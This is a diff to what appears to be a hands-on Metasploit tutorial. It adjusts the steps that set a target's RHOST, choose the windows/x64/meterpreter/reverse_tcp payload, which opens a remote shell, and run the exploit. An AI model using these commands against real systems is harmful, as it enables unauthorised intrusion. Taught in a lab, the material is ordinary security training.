@@ -116,7 +116,8 @@ NOTE: Optional...you can scan for very detailed versions and o/s with:
     i. Look at your options…also use the show options if you cannot find the RHOST
   d. Type: set RHOST <target_ip>
     i. Type set again or show options to see the changes
-  e. Type set payload windows/x64/meterpreter/reverse_tcp
+  e. Type: set payload windows/x64/meterpreter/reverse_tcp
+    i. Without the payload this will not work!
   f. Type: run or exploit
 
 5. Now wait for the process to finish...you should see the word WIN like so...
